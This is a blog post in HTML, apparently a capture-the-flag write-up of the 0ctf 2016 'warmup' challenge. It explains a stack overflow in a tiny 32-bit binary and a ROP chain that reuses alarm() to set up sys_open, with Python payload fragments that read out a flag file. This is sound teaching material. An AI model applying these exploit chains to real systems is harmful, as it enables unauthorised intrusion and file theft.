@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>0ctf 2016 - Warmup write-up</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="I participated to 0ctf but only had time to play for the reversing challenge trace (write-up coming up soon) during the competition...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="gef">
+    <meta name="tags" content="ida">
+    <meta name="tags" content="0ctf-2016">
+    <meta name="tags" content="x86">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="0ctf 2016 - Warmup write-up"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="I participated to 0ctf but only had time to play for the reversing challenge trace (write-up coming up soon) during the competition..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2016-03-14 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2016-03-14 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="gef"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="ida"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="0ctf-2016"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="x86"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="0ctf 2016 - Warmup write-up">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="I participated to 0ctf but only had time to play for the reversing challenge trace (write-up coming up soon) during the competition...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "0ctf 2016 - Warmup write-up",
+  "headline": "0ctf 2016 - Warmup write-up",
+  "datePublished": "2016-03-14 00:00:00-07:00",
+  "dateModified": "2016-03-14 00:00:00-07:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html",
+  "description": "I participated to 0ctf but only had time to play for the reversing challenge trace (write-up coming up soon) during the competition..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">0ctf 2016 - Warmup write-up</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">14 Mar 2016</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <p>I participated to <a href="https://ctftime.org/team/4419/">0ctf</a> but only had time to play for
+the reversing challenge <code>trace</code> (write-up coming up soon) during the competition
+time.</p>
+<p>I did this challenge only for fun after the CTF was over so I do not know the
+flag, and since I found it interesting, I decided to write a quick write-up.</p>
+<p>And kudos to all teams who solved it !</p>
+<h3>Info</h3>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>!file<span class="w"> </span>./warmup
+./warmup:<span class="w"> </span>ELF<span class="w"> </span><span class="m">32</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>Intel<span class="w"> </span><span class="m">80386</span>,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>statically<span class="w"> </span>linked,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>c1791030f336fcc9cda1da8dc3a3f8a70d930a11,<span class="w"> </span>stripped
+gef➤<span class="w">  </span>checksec<span class="w"> </span>warmup
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>checksec<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;warmup&#39;</span>
+Canary:<span class="w">                                           </span>No
+NX<span class="w"> </span>Support:<span class="w">                                       </span>Yes
+PIE<span class="w"> </span>Support:<span class="w">                                      </span>No
+RPATH:<span class="w">                                            </span>No
+RUNPATH:<span class="w">                                          </span>No
+Partial<span class="w"> </span>RelRO:<span class="w">                                    </span>No
+Full<span class="w"> </span>RelRO:<span class="w">                                       </span>No
+</code></pre></div>
+
+<p>Pretty stripped down file, very small (which seemed weird for a statically
+linked file). Stack canary and PIE are not on, but NX is.</p>
+<h3>Vulnerability</h3>
+<p>The binary is really small, does not do much either, so the vulnerability is
+quite easy to find and trigger.</p>
+<p><img alt="vuln" src="https://i.imgur.com/jpU2YsD.png"></p>
+<p>At 0x08048174, We have a <code>read(socket, buffer, 52)</code> where buffer can only
+contain 32 bytes, so we have a classic stack overflow. A part of the challenge
+is however due to the fact that our controlled part is quite limited
+(i.e. 52-32=20 bytes=5 DWORD).</p>
+<h3>Exploitation</h3>
+<p>In addition to not having a lot of gadgets (the source was written in pure
+assembly), no libc, etc. 0ctf organizers added that</p>
+<div class="highlight"><pre><span></span><code><span class="n">notice</span><span class="o">:</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="kd">protected</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sandbox</span><span class="o">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">only</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="sr">/home/warmup/</span><span class="n">flag</span>
+</code></pre></div>
+
+<p>Meaning: we cannot simply write <code>/bin/sh</code> somewhere in memory, set <code>eax</code> to 11
+and simply use a gadget to set <code>ebx</code>, <code>ecx</code>, <code>edx</code> to value loaded from the
+stack. We have to go all the way to open, read, write back the value of the flag
+located in <code>/home/warmup/flag</code>.</p>
+<p>This lead to a much funkier way to exploit.</p>
+<h4>Objective</h4>
+<p>The objective here seems pretty straight forward. We need to :</p>
+<ol>
+<li>Write <code>/tmp/flag</code> in a predictable and writable location ( anywhere in the
+   <code>.data</code> section will do just fine).</li>
+<li>Forge a <code>sys_open(flag, RWX)</code> gadget</li>
+<li>Forge a <code>sys_read(fd, another_writeable_location, 50)</code> gadget</li>
+<li>Forge a <code>sys_write(socket, another_writeable_location, 50)</code></li>
+</ol>
+<p>And it is done! In theory it seems pretty easy, but it took me a few hours
+(never underestimate a challenge ☺).</p>
+<h4>Interesting gadgets</h4>
+<p>What the binary provides us with are gadgets to read and write:</p>
+<div class="highlight"><pre><span></span><code>--read
+.text:0804811D<span class="w">                 </span>mov<span class="w">     </span>eax,<span class="w"> </span><span class="m">3</span>
+.text:08048122<span class="w">                 </span>mov<span class="w">     </span>ebx,<span class="w"> </span><span class="o">[</span>esp+fd<span class="o">]</span><span class="w">   </span><span class="p">;</span><span class="w"> </span>fd
+.text:08048126<span class="w">                 </span>mov<span class="w">     </span>ecx,<span class="w"> </span><span class="o">[</span>esp+addr<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>addr
+.text:0804812A<span class="w">                 </span>mov<span class="w">     </span>edx,<span class="w"> </span><span class="o">[</span>esp+len<span class="o">]</span><span class="w">  </span><span class="p">;</span><span class="w"> </span>len
+.text:0804812E<span class="w">                 </span>int<span class="w">     </span>80h<span class="w">             </span><span class="p">;</span><span class="w"> </span>LINUX<span class="w"> </span>-<span class="w"> </span>sys_read
+
+--write
+.text:08048135<span class="w">                 </span>mov<span class="w">     </span>eax,<span class="w"> </span><span class="m">4</span>
+.text:0804813A<span class="w">                 </span>mov<span class="w">     </span>ebx,<span class="w"> </span><span class="o">[</span>esp+fd<span class="o">]</span><span class="w">   </span><span class="p">;</span><span class="w"> </span>fd
+.text:0804813E<span class="w">                 </span>mov<span class="w">     </span>ecx,<span class="w"> </span><span class="o">[</span>esp+addr<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>addr
+.text:08048142<span class="w">                 </span>mov<span class="w">     </span>edx,<span class="w"> </span><span class="o">[</span>esp+len<span class="o">]</span><span class="w">  </span><span class="p">;</span><span class="w"> </span>len
+.text:08048146<span class="w">                 </span>int<span class="w">     </span>80h<span class="w">             </span><span class="p">;</span><span class="w"> </span>LINUX<span class="w"> </span>-<span class="w"> </span>sys_write
+</code></pre></div>
+
+<p>Where the arguments are read from the limited stack we control.</p>
+<p>However, we do not have an <code>sys_open</code> gadget, but since we can control <code>ebx</code>
+from the stack, all we need is to find a way to set <code>eax</code> to
+<a href="https://raw.githubusercontent.com/torvalds/linux/master/arch/x86/entry/syscalls/syscall_32.tbl">5</a></p>
+<p>My original intention was to force a call to <code>sys_read</code> from our socket, and
+send 5 bytes of junk data so that the syscall can return with the right value in
+<code>eax</code>. Unfortunately, we do not have enough space in our stack to chain correctly our
+<code>read</code> arguments, then jump into it and finally jump back to our next gadget ☹ .</p>
+<p>After quite some time, I realized that <code>warmup</code> starts by initializing an alarm
+for 10 seconds (which when <code>SIGALRM</code> is received, will kill the
+program).</p>
+<div class="highlight"><pre><span></span><code>.text:0804810D<span class="w">                 </span>mov<span class="w">     </span>eax,<span class="w"> </span><span class="m">27</span>
+.text:08048112<span class="w">                 </span>mov<span class="w">     </span>ebx,<span class="w"> </span><span class="o">[</span>esp+seconds<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>seconds
+.text:08048116<span class="w">                 </span>int<span class="w">     </span>80h<span class="w">             </span><span class="p">;</span><span class="w"> </span>LINUX<span class="w"> </span>-<span class="w"> </span>sys_alarm
+</code></pre></div>
+
+<p>Nevertheless, this could be valuable to us, because RTFM:</p>
+<blockquote>
+<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="nv">alarm</span><span class="ss">()</span><span class="w">  </span><span class="nv">returns</span><span class="w">  </span><span class="nv">the</span><span class="w"> </span><span class="nv">number</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">seconds</span><span class="w"> </span><span class="nv">remaining</span><span class="w"> </span><span class="k">until</span><span class="w"> </span><span class="nv">any</span><span class="w"> </span><span class="nv">previously</span>
+<span class="w">  </span><span class="nv">scheduled</span><span class="w"> </span><span class="nv">alarm</span><span class="w"> </span><span class="nv">was</span><span class="w"> </span><span class="nv">due</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">be</span><span class="w"> </span><span class="nv">delivered</span>,<span class="w"> </span><span class="nv">or</span><span class="w"> </span><span class="nv">zero</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nv">there</span><span class="w"> </span><span class="nv">was</span><span class="w"> </span><span class="nv">no</span>
+<span class="w">  </span><span class="nv">previously</span><span class="w"> </span><span class="nv">scheduled</span><span class="w"> </span><span class="nv">alarm</span>.
+</code></pre></div>
+
+</blockquote>
+<p>That means that if we jump a second time into the gadget @0x0804810D (i.e. call
+<code>alarm()</code> a second time), <code>eax</code> will be populated with whatever time is left
+before SIGALRM is issued!
+And since <code>alarm()</code> can take any integer as argument, our syscall will not
+return as an error! So by sleeping 5 seconds, <code>sys_alarm</code> will return with <code>eax</code>
+set to <code>NR_sys_open</code> (5), and we can use the stack to populate the other
+registers required for <code>sys_open</code>!</p>
+<h4>Attack</h4>
+<p>Again, because of our limited space in the stack, we need to trigger the
+vulnerability multiple times. To do, we have to perform only one operation, then
+return to the original function (<code>0x0804815A</code>), and let the control flow repeat
+again until it re-hit our vulnerability.</p>
+<p>So let's go back to the steps we set in the <em>Objective</em> part for the
+exploitation part:</p>
+<p>Writing <code>/tmp/flag</code> in a predictable and writable location can be done with the
+following gadgets:</p>
+<div class="highlight"><pre><span></span><code>    <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">sys_read</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">ret_to_orginal_function</span><span class="p">)</span> <span class="c1"># ret back to vuln function</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">writable_addr</span><span class="p">)</span> <span class="c1"># addr</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag_path</span><span class="p">))</span> <span class="c1"># len</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;Good Luck!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Now we have to sleep !! ☺</p>
+<div class="highlight"><pre><span></span><code>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Now we can send our second payload, to call <code>alarm</code>, setting <code>eax</code> to
+<code>NR_sys_open</code>, and append the other arguments:</p>
+<div class="highlight"><pre><span></span><code>    <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">sys_alarm</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">set_ebx_ecx_edx_int80</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">ret_to_orginal_function</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">writable_addr</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># READ|WRITE|EXECUTE</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;Good Luck!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>We have now a file descriptor open to our flag file! Let's read its content:</p>
+<div class="highlight"><pre><span></span><code>    <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">sys_read</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">ret_to_orginal_function</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1"># file_fd</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">writable_addr2</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;Good Luck!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>... And write it back to our socket (and exit cleanly, just because):</p>
+<div class="highlight"><pre><span></span><code>    <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">sys_write</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">sys_exit</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># fd stdout</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="n">writable_addr2</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">+=</span> <span class="n">i_s</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</code></pre></div>
+
+<p>This write-up does not give justice to the challenge, making it look easy. But
+it was not. I really like how you are made to create really inventive and neat
+technique for subverting existing calls to set up the structure the exact way
+you want it.</p>
+<p>For those who want, the full exploit script is
+<a href="https://gist.github.com/hugsy/8e31ddc61dba7d4e7c1f">here</a>. But again, it was
+not tested against the game server.</p>
+<p>Another good lesson to pay attention to details...</p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=0ctf 2016 - Warmup write-up&amp;url=https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/gef">gef</a><a href="https://blahcat.github.io/tag/ida">ida</a><a href="https://blahcat.github.io/tag/0ctf-2016">0ctf-2016</a><a href="https://blahcat.github.io/tag/x86">x86</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=0ctf 2016 - Warmup write-up">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">BCTF 2016 - Ruin</h2>
+                            <p class="post-nav-excerpt">This is an ARM 32b exploitation challenge part of the BCTF competition, which I've...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2016/03/08/bkpctf-2016-complex-calc.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">BKPCTF 2016 - Complex Calc</h2>
+                            <p class="post-nav-excerpt">The challenge is the sequel to simple_calc. If you haven't read our write-up, now is...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
